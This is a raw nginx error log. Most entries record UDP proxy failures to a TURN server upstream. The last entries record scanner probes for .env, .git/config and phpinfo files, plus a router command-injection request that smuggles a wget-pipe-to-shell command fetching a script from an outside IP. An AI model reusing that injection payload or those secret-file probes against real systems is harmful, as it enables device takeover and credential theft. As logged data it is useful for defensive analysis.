2025/09/02 22:45:22 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:45:22 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:45:22 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:45:22 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:45:22 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:45:22 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:68/0, bytes from/to upstream:0/68
2025/09/02 22:45:22 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:68/0, bytes from/to upstream:0/68
2025/09/02 22:45:22 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:68/0, bytes from/to upstream:0/68
2025/09/02 22:45:22 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:96/0, bytes from/to upstream:0/96
2025/09/02 22:45:22 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:96/0, bytes from/to upstream:0/96
2025/09/02 22:45:23 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:116/0, bytes from/to upstream:0/116
2025/09/02 22:45:23 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:116/0, bytes from/to upstream:0/116
2025/09/02 22:45:23 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:116/0, bytes from/to upstream:0/116
2025/09/02 22:45:23 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:144/0, bytes from/to upstream:0/144
2025/09/02 22:45:24 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:136/0, bytes from/to upstream:0/136
2025/09/02 22:45:24 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:164/0, bytes from/to upstream:0/164
2025/09/02 22:45:24 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:164/0, bytes from/to upstream:0/164
2025/09/02 22:45:24 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:164/0, bytes from/to upstream:0/164
2025/09/02 22:45:24 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:192/0, bytes from/to upstream:0/192
2025/09/02 22:45:26 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:212/0, bytes from/to upstream:0/212
2025/09/02 22:45:26 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:184/0, bytes from/to upstream:0/184
2025/09/02 22:45:26 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:212/0, bytes from/to upstream:0/212
2025/09/02 22:45:26 [error] 19066#19066: *7168 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:212/0, bytes from/to upstream:0/212
2025/09/02 22:45:26 [error] 19066#19066: *7170 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:45:26 [error] 19066#19066: *7172 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:45:29 [warn] 19066#19066: *7170 upstream server temporarily disabled while proxying connection, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:45:29 [warn] 19066#19066: *7168 upstream server temporarily disabled while proxying connection, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:212/0, bytes from/to upstream:0/212
2025/09/02 22:45:29 [warn] 19066#19066: *7172 upstream server temporarily disabled while proxying connection, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:45:30 [error] 19066#19066: *7181 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:30 [error] 19066#19066: *7182 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:30 [error] 19066#19066: *7183 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:30 [error] 19066#19066: *7184 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:30 [error] 19066#19066: *7185 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:30 [error] 19066#19066: *7186 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:38 [error] 19066#19066: *7193 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:38 [error] 19066#19066: *7194 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:38 [error] 19066#19066: *7195 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:38 [error] 19066#19066: *7196 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:38 [error] 19066#19066: *7197 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:38 [error] 19066#19066: *7198 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:46 [error] 19066#19066: *7203 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:45:46 [error] 19066#19066: *7205 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:45:46 [error] 19066#19066: *7207 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:46 [error] 19066#19066: *7203 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:45:46 [error] 19066#19066: *7208 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:46 [error] 19066#19066: *7205 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:45:49 [warn] 19066#19066: *7203 upstream server temporarily disabled while proxying connection, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:45:49 [warn] 19066#19066: *7205 upstream server temporarily disabled while proxying connection, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:45:54 [error] 19066#19066: *7211 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:54 [error] 19066#19066: *7212 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:54 [error] 19066#19066: *7213 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:45:54 [error] 19066#19066: *7214 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:54 [error] 19066#19066: *7215 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:45:54 [error] 19066#19066: *7216 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:25 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:52:25 [error] 19067#19067: *7399 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "10.10.20.10:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:52:25 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:52:25 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:52:25 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:52:25 [error] 19066#19066: *7403 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:25 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:68/0, bytes from/to upstream:0/68
2025/09/02 22:52:25 [error] 19066#19066: *7404 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:25 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:68/0, bytes from/to upstream:0/68
2025/09/02 22:52:25 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:96/0, bytes from/to upstream:0/96
2025/09/02 22:52:25 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:96/0, bytes from/to upstream:0/96
2025/09/02 22:52:25 [error] 19066#19066: *7405 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:26 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:116/0, bytes from/to upstream:0/116
2025/09/02 22:52:26 [error] 19066#19066: *7406 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:26 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:116/0, bytes from/to upstream:0/116
2025/09/02 22:52:26 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:144/0, bytes from/to upstream:0/144
2025/09/02 22:52:26 [error] 19066#19066: *7407 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:27 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:164/0, bytes from/to upstream:0/164
2025/09/02 22:52:27 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:164/0, bytes from/to upstream:0/164
2025/09/02 22:52:27 [error] 19066#19066: *7408 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:27 [error] 19066#19066: *7409 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:27 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:192/0, bytes from/to upstream:0/192
2025/09/02 22:52:28 [warn] 19067#19067: *7399 upstream server temporarily disabled while proxying connection, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "10.10.20.10:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:52:29 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:212/0, bytes from/to upstream:0/212
2025/09/02 22:52:29 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:212/0, bytes from/to upstream:0/212
2025/09/02 22:52:29 [error] 19066#19066: *7412 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:29 [error] 19066#19066: *7397 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:52:29 [error] 19066#19066: *7401 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:52:29 [error] 19066#19066: *7413 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:32 [warn] 19066#19066: *7397 upstream server temporarily disabled while proxying connection, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:52:32 [warn] 19066#19066: *7401 upstream server temporarily disabled while proxying connection, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:240/0, bytes from/to upstream:0/240
2025/09/02 22:52:33 [error] 19066#19066: *7416 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:33 [error] 19066#19066: *7417 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:33 [error] 19066#19066: *7418 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:33 [error] 19066#19066: *7419 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:33 [error] 19066#19066: *7420 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:33 [error] 19066#19066: *7421 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:41 [error] 19066#19066: *7426 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:41 [error] 19066#19066: *7427 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:41 [error] 19066#19066: *7428 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:41 [error] 19066#19066: *7429 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:41 [error] 19066#19066: *7430 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:41 [error] 19066#19066: *7431 no live upstreams while connecting to upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:49 [error] 19066#19066: *7436 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:52:49 [error] 19066#19066: *7438 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:20/0, bytes from/to upstream:0/20
2025/09/02 22:52:49 [error] 19066#19066: *7440 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:20/0, bytes from/to upstream:0/0
2025/09/02 22:52:49 [error] 19066#19066: *7436 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:52:49 [error] 19066#19066: *7438 recv() failed (111: Connection refused) while proxying and reading from upstream, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:52:49 [error] 19066#19066: *7441 no live upstreams while connecting to upstream, udp client: 2600:6c4a:67f:aac0:a166:d910:2f0e:76b9, server: [::]:3478, upstream: "eturnal_tcp", bytes from/to client:28/0, bytes from/to upstream:0/0
2025/09/02 22:52:52 [warn] 19066#19066: *7436 upstream server temporarily disabled while proxying connection, udp client: 2600:6c4a:67f:aac0:d4ef:4374:8ed1:b54f, server: [::]:3478, upstream: "10.10.20.10:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/02 22:52:52 [warn] 19066#19066: *7438 upstream server temporarily disabled while proxying connection, udp client: 47.26.234.89, server: 0.0.0.0:3478, upstream: "[fd12:3456:789a::20:10]:5349", bytes from/to client:48/0, bytes from/to upstream:0/48
2025/09/03 00:45:54 [error] 1969#1969: *3070 open() "/var/www/html/.env" failed (2: No such file or directory), client: 188.166.61.150, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "185.28.22.166"
2025/09/03 00:45:54 [error] 1966#1966: *3071 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 188.166.61.150, server: localhost-nginx-proxy-manager, request: "GET /.git/config HTTP/1.1", host: "185.28.22.166"
2025/09/03 00:53:09 [error] 1966#1966: *3242 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 121.167.125.180, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1", host: "185.28.22.166:80"
2025/09/03 00:53:09 [error] 1966#1966: *3243 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 121.167.125.180, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1", host: "185.28.22.166:80"
2025/09/03 01:54:30 [error] 1969#1969: *6426 open() "/var/www/html/robots.txt" failed (2: No such file or directory), client: 66.249.64.165, server: localhost-nginx-proxy-manager, request: "GET /robots.txt HTTP/1.1", host: "185.28.22.166"
2025/09/03 02:57:32 [error] 1969#1969: *8182 open() "/var/www/html/.env" failed (2: No such file or directory), client: 107.150.0.91, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "turn.landingdev.xyz"
2025/09/03 03:17:24 [error] 1969#1969: *8736 open() "/var/www/html/.env" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:25 [error] 1969#1969: *8736 open() "/var/www/html/phpinfo" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /phpinfo HTTP/1.1", host: "call.landingdev.xyz"
2025/09/03 03:17:25 [error] 1969#1969: *8736 open() "/var/www/html/phpinfo.php" failed (2: No such file or directory), client: 185.177.72.16, server: localhost-nginx-proxy-manager, request: "GET /phpinfo.php HTTP/1.1", host: "call.landingdev.xyz"
